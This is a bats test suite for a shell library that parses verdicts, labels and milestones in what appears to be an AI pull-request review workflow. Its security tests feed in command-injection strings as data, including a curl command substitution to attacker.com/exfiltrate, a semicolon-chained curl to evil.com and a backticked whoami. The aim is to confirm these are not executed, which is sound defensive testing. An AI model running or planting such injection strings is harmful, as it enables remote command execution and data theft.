#!/usr/bin/env bats
# Bash Automated Testing System (bats) tests for ai-review-common.sh
# Run: bats .github/scripts/ai-review-common.bats
#
# Test Coverage:
# - SEC-T001: Command injection via PR title
# - SEC-T002: Command injection via PR body
# - SEC-T003: Semicolon injection
# - SEC-T004: Backtick injection
# - SEC-T005: Race condition (comment editing uses specific ID)
# - Logic: Verdict parsing and fallback
# - Portability: sed works across platforms

# Setup - source the script under test
setup() {
    # Create temp directory for test artifacts
    export AI_REVIEW_DIR="${BATS_TMPDIR}/ai-review-test-$$"
    mkdir -p "$AI_REVIEW_DIR"

    # Source the script under test (suppress init output)
    source "${BATS_TEST_DIRNAME}/ai-review-common.sh" 2>/dev/null || true

    # Create mock gh command directory
    export MOCK_DIR="${BATS_TMPDIR}/mock-$$"
    mkdir -p "$MOCK_DIR"

    # Track mock calls
    export MOCK_CALLS_FILE="${MOCK_DIR}/calls.log"
    touch "$MOCK_CALLS_FILE"
}

teardown() {
    rm -rf "$AI_REVIEW_DIR"
    rm -rf "$MOCK_DIR"
}

# ==============================================================================
# SECURITY TESTS - Code Injection Prevention (SEC-T001 through SEC-T004)
# ==============================================================================

@test "SEC-T001: PR title with command injection is safely handled" {
    # Test that shell metacharacters in input don't execute
    local malicious_title='Test $(echo INJECTED)'

    # parse_verdict should handle this safely
    local result
    result=$(parse_verdict "VERDICT: PASS for $malicious_title")

    # Should extract PASS, not execute the injection
    [ "$result" = "PASS" ]

    # Verify "INJECTED" was never echoed (would appear in environment)
    [[ ! "$result" =~ "INJECTED" ]]
}

@test "SEC-T002: PR body with curl injection is safely handled" {
    # Test command substitution in body context
    local malicious_body='$(curl attacker.com/exfiltrate)'

    # parse_verdict should handle this safely
    local result
    result=$(parse_verdict "Analysis of $malicious_body shows VERDICT: WARN")

    [ "$result" = "WARN" ]
}

@test "SEC-T003: Semicolon command chaining is prevented" {
    # Test semicolon injection
    local malicious_input='Fix bug"; curl evil.com; echo "'

    local result
    result=$(parse_verdict "Review: $malicious_input VERDICT: PASS")

    # Should extract PASS, semicolons treated as literal characters
    [ "$result" = "PASS" ]
}

@test "SEC-T004: Backtick command substitution is prevented" {
    # Test backtick injection
    local malicious_input='`whoami`'

    local result
    result=$(parse_verdict "Checking $malicious_input VERDICT: WARN")

    # Should extract WARN, backticks treated as literal characters
    [ "$result" = "WARN" ]
}

@test "SEC-T005: Comment editing uses specific ID, not --edit-last" {
    # Verify the source code doesn't contain --edit-last
    # This is a static code analysis test

    local script_content
    script_content=$(cat "${BATS_TEST_DIRNAME}/ai-review-common.sh")

    # Should NOT find --edit-last in the code (race condition fix)
    if echo "$script_content" | grep -q -- '--edit-last'; then
        echo "FAIL: Found --edit-last in ai-review-common.sh - race condition vulnerability"
        return 1
    fi

    # Should find gh api PATCH pattern (correct implementation)
    if ! echo "$script_content" | grep -q 'gh api.*PATCH.*issues/comments'; then
        echo "FAIL: Expected gh api PATCH for comment editing"
        return 1
    fi
}

# ==============================================================================
# VERDICT PARSING TESTS
# ==============================================================================

@test "parse_verdict: extracts explicit VERDICT: PASS" {
    local output="Analysis complete. VERDICT: PASS"
    local result
    result=$(parse_verdict "$output")
    [ "$result" = "PASS" ]
}

@test "parse_verdict: extracts explicit VERDICT: WARN" {
    local output="Some issues found. VERDICT: WARN"
    local result
    result=$(parse_verdict "$output")
    [ "$result" = "WARN" ]
}

@test "parse_verdict: extracts explicit VERDICT: CRITICAL_FAIL" {
    local output="Major issues found. VERDICT: CRITICAL_FAIL"
    local result
    result=$(parse_verdict "$output")
    [ "$result" = "CRITICAL_FAIL" ]
}

@test "parse_verdict: extracts explicit VERDICT: REJECTED" {
    local output="Cannot proceed. VERDICT: REJECTED"
    local result
    result=$(parse_verdict "$output")
    [ "$result" = "REJECTED" ]
}

@test "parse_verdict: fallback detects 'approved' keyword -> PASS" {
    local output="Everything looks good, approved"
    local result
    result=$(parse_verdict "$output")
    [ "$result" = "PASS" ]
}

@test "parse_verdict: fallback detects 'looks good' keyword -> PASS" {
    local output="The implementation looks good to me"
    local result
    result=$(parse_verdict "$output")
    [ "$result" = "PASS" ]
}

@test "parse_verdict: fallback detects 'warning' keyword -> WARN" {
    local output="Some items need attention, warning"
    local result
    result=$(parse_verdict "$output")
    [ "$result" = "WARN" ]
}

@test "parse_verdict: fallback detects 'must fix' keyword -> REJECTED" {
    local output="These issues must fix before merge"
    local result
    result=$(parse_verdict "$output")
    [ "$result" = "REJECTED" ]
}

@test "parse_verdict: fallback detects 'critical failure' -> CRITICAL_FAIL" {
    local output="There was a critical failure in the code"
    local result
    result=$(parse_verdict "$output")
    [ "$result" = "CRITICAL_FAIL" ]
}

@test "parse_verdict: empty output returns CRITICAL_FAIL" {
    local result
    result=$(parse_verdict "")
    [ "$result" = "CRITICAL_FAIL" ]
}

@test "parse_verdict: handles malformed VERDICT syntax (no space)" {
    local output="VERDICT:PASS"
    local result
    result=$(parse_verdict "$output")
    [ "$result" = "PASS" ]
}

@test "parse_verdict: handles VERDICT with extra spaces" {
    local output="VERDICT:   WARN"
    local result
    result=$(parse_verdict "$output")
    [ "$result" = "WARN" ]
}

@test "parse_verdict: prioritizes explicit VERDICT over keywords" {
    # If explicit VERDICT says CRITICAL_FAIL but keywords say "looks good"
    local output="looks good but VERDICT: CRITICAL_FAIL"
    local result
    result=$(parse_verdict "$output")
    [ "$result" = "CRITICAL_FAIL" ]
}

@test "parse_verdict: handles multiline output" {
    local output="Line 1
Line 2
VERDICT: PASS
Line 4"
    local result
    result=$(parse_verdict "$output")
    [ "$result" = "PASS" ]
}

@test "parse_verdict: no parseable verdict returns CRITICAL_FAIL (failure mode)" {
    local output="Some random text without any verdict keywords"
    local result
    result=$(parse_verdict "$output")
    [ "$result" = "CRITICAL_FAIL" ]
}

# ==============================================================================
# LABEL PARSING TESTS
# ==============================================================================

@test "parse_labels: extracts single LABEL" {
    local output="LABEL: bug"
    local result
    result=$(parse_labels "$output")
    [ "$result" = '["bug"]' ]
}

@test "parse_labels: extracts multiple LABELs" {
    local output="LABEL: bug
LABEL: security
LABEL: high-priority"
    local result
    result=$(parse_labels "$output")

    # Verify result contains all labels (order may vary)
    echo "$result" | jq -e 'contains(["bug"])' >/dev/null
    echo "$result" | jq -e 'contains(["security"])' >/dev/null
    echo "$result" | jq -e 'contains(["high-priority"])' >/dev/null
}

@test "parse_labels: returns empty array for no labels" {
    local output="No labels here"
    local result
    result=$(parse_labels "$output")
    [ "$result" = '[]' ]
}

@test "parse_labels: handles labels with hyphens" {
    local output="LABEL: good-first-issue"
    local result
    result=$(parse_labels "$output")
    [ "$result" = '["good-first-issue"]' ]
}

# ==============================================================================
# MILESTONE PARSING TESTS
# ==============================================================================

@test "parse_milestone: extracts milestone" {
    local output="MILESTONE: v1.2"
    local result
    result=$(parse_milestone "$output")
    [ "$result" = "v1.2" ]
}

@test "parse_milestone: returns empty for no milestone" {
    local output="No milestone here"
    local result
    result=$(parse_milestone "$output")
    [ -z "$result" ]
}

@test "parse_milestone: handles milestone with dots" {
    local output="MILESTONE: v2.0.0-beta"
    local result
    result=$(parse_milestone "$output")
    [ "$result" = "v2.0.0-beta" ]
}

# ==============================================================================
# AGGREGATE VERDICTS TESTS
# ==============================================================================

@test "aggregate_verdicts: all PASS returns PASS" {
    local result
    result=$(aggregate_verdicts "PASS" "PASS" "PASS")
    [ "$result" = "PASS" ]
}

@test "aggregate_verdicts: one WARN returns WARN" {
    local result
    result=$(aggregate_verdicts "PASS" "WARN" "PASS")
    [ "$result" = "WARN" ]
}

@test "aggregate_verdicts: CRITICAL_FAIL takes precedence" {
    local result
    result=$(aggregate_verdicts "PASS" "WARN" "CRITICAL_FAIL")
    [ "$result" = "CRITICAL_FAIL" ]
}

@test "aggregate_verdicts: REJECTED takes precedence" {
    local result
    result=$(aggregate_verdicts "PASS" "REJECTED" "WARN")
    [ "$result" = "CRITICAL_FAIL" ]
}

@test "aggregate_verdicts: empty array returns PASS" {
    local result
    result=$(aggregate_verdicts)
    [ "$result" = "PASS" ]
}

# ==============================================================================
# PORTABILITY TESTS (sed vs grep -P)
# ==============================================================================

@test "sed portability: verdict extraction works" {
    # This test verifies the sed-based extraction works (should work on both GNU and BSD)
    local output="Some text VERDICT: PASS more text"
    local result
    result=$(echo "$output" | sed -n 's/.*VERDICT:[[:space:]]*\([A-Z_]*\).*/\1/p' | head -1)
    [ "$result" = "PASS" ]
}

@test "sed portability: label extraction works" {
    local output="LABEL: test-label"
    local result
    result=$(echo "$output" | sed -n 's/.*LABEL:[[:space:]]*\([^[:space:]]*\).*/\1/p' | head -1)
    [ "$result" = "test-label" ]
}

@test "sed portability: milestone extraction works" {
    local output="MILESTONE: v1.0"
    local result
    result=$(echo "$output" | sed -n 's/.*MILESTONE:[[:space:]]*\([^[:space:]]*\).*/\1/p' | head -1)
    [ "$result" = "v1.0" ]
}

# ==============================================================================
# RETRY LOGIC TESTS
# ==============================================================================

@test "retry_with_backoff: succeeds on first try" {
    local attempts=0
    test_cmd() {
        attempts=$((attempts + 1))
        return 0
    }

    # Export for subshell
    export -f test_cmd

    retry_with_backoff "test_cmd" 3 0
    [ $? -eq 0 ]
}

@test "retry_with_backoff: succeeds on retry" {
    # Create a file-based counter for persistence across subshells
    local counter_file="${MOCK_DIR}/attempt_counter"
    echo "0" > "$counter_file"

    test_cmd() {
        local count
        count=$(cat "$counter_file")
        count=$((count + 1))
        echo "$count" > "$counter_file"
        [ "$count" -ge 2 ]
    }

    export -f test_cmd
    export counter_file

    retry_with_backoff "test_cmd" 3 0
    [ $? -eq 0 ]

    local final_count
    final_count=$(cat "$counter_file")
    [ "$final_count" -ge 2 ]
}

@test "retry_with_backoff: fails after max retries" {
    run retry_with_backoff "false" 2 0
    [ "$status" -eq 1 ]
}

# ==============================================================================
# FORMAT FUNCTIONS TESTS
# ==============================================================================

@test "format_details: creates collapsible section" {
    local result
    result=$(format_details "Test Title" "Test Content")

    echo "$result" | grep -q "<details>"
    echo "$result" | grep -q "<summary>Test Title</summary>"
    echo "$result" | grep -q "Test Content"
    echo "$result" | grep -q "</details>"
}

@test "format_verdict_alert: PASS creates TIP alert" {
    local result
    result=$(format_verdict_alert "PASS" "All good")

    echo "$result" | grep -q '\[!TIP\]'
    echo "$result" | grep -q 'Verdict: PASS'
}

@test "format_verdict_alert: WARN creates WARNING alert" {
    local result
    result=$(format_verdict_alert "WARN" "Some issues")

    echo "$result" | grep -q '\[!WARNING\]'
}

@test "format_verdict_alert: CRITICAL_FAIL creates CAUTION alert" {
    local result
    result=$(format_verdict_alert "CRITICAL_FAIL" "Major issues")

    echo "$result" | grep -q '\[!CAUTION\]'
}

@test "get_verdict_alert_type: returns correct types" {
    [ "$(get_verdict_alert_type "PASS")" = "TIP" ]
    [ "$(get_verdict_alert_type "WARN")" = "WARNING" ]
    [ "$(get_verdict_alert_type "PARTIAL")" = "WARNING" ]
    [ "$(get_verdict_alert_type "CRITICAL_FAIL")" = "CAUTION" ]
    [ "$(get_verdict_alert_type "REJECTED")" = "CAUTION" ]
    [ "$(get_verdict_alert_type "UNKNOWN")" = "NOTE" ]
}

@test "get_exit_code: returns correct codes" {
    [ "$(get_exit_code "PASS")" = "0" ]
    [ "$(get_exit_code "WARN")" = "0" ]
    [ "$(get_exit_code "CRITICAL_FAIL")" = "1" ]
    [ "$(get_exit_code "REJECTED")" = "1" ]
}

# ==============================================================================
# UTILITY FUNCTION TESTS
# ==============================================================================

@test "json_escape: escapes special characters" {
    local result
    result=$(json_escape 'test "quoted" string')

    # Result should be a valid JSON string
    echo "$result" | jq -e . >/dev/null
}

@test "json_escape: handles newlines" {
    local result
    result=$(json_escape $'line1\nline2')

    # Result should be a valid JSON string with escaped newline
    echo "$result" | jq -e . >/dev/null
}

@test "table_row: formats markdown table row" {
    local result
    result=$(table_row "Col1" "Col2" "Col3")
    [ "$result" = "| Col1|Col2|Col3 |" ]
}

@test "require_env: passes with all vars set" {
    export TEST_VAR1="value1"
    export TEST_VAR2="value2"

    require_env "TEST_VAR1" "TEST_VAR2"
    [ $? -eq 0 ]

    unset TEST_VAR1 TEST_VAR2
}

@test "require_env: fails with missing vars" {
    unset MISSING_VAR

    run require_env "MISSING_VAR"
    [ "$status" -eq 1 ]
}

@test "log: outputs with timestamp" {
    local result
    result=$(log "Test message")

    # Should contain timestamp pattern [YYYY-MM-DD HH:MM:SS]
    echo "$result" | grep -qE '\[[0-9]{4}-[0-9]{2}-[0-9]{2} [0-9]{2}:[0-9]{2}:[0-9]{2}\]'
    echo "$result" | grep -q "Test message"
}

@test "log_error: outputs to stderr" {
    local result
    result=$(log_error "Error message" 2>&1)

    echo "$result" | grep -q "ERROR:"
    echo "$result" | grep -q "Error message"
}
